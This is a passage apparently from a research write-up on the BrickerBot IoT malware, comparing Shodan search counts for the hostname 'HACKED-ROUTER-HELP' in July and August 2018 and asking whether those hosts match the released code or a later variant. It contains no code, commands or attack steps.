A more narrow search for the phrase "HACKED-ROUTER-HELP" returned a similar 21,091 results. The same search only three weeks prior on 26 July 2018 had returned 43,680 results.

A search for "HACKED-ROUTER-HELP" from 15 August 2018.
<image src="https://raw.githubusercontent.com/nyoshimizu/Deobfuscated-BrickerBot/master/Shodan%20screenshots/hacked-router-help-2.PNG" width="640px" />

A search for "HACKED-ROUTER-HELP" from 26 July 2018.
<img src="https://raw.githubusercontent.com/nyoshimizu/Deobfuscated-BrickerBot/master/Shodan%20screenshots/hacked-router-help.PNG" width="640px" />

Based on the code available to us, the Shodan results we see certainly do not match. None of the exact messages in the code seem to match any results in Shodan. However, based on the message they do seem to have the same mission in mind. It may be a new, repurposed greyhat malware. Perhaps they are remnants of BrickerBot.4 or some other version, still active in the wild. In corroboration, Trustwave's Shodan searches in 2017 seem to suggest that they couldn't find exact matches to hostname messages in the released code either (possibly why they attributed ""hacker-router-help.." hostnames instead). So it's possible today's searches on Shodan measure the same thing Trustwave saw in 2017, which is some version of BrickerBot that does not exactly match the code that was released.

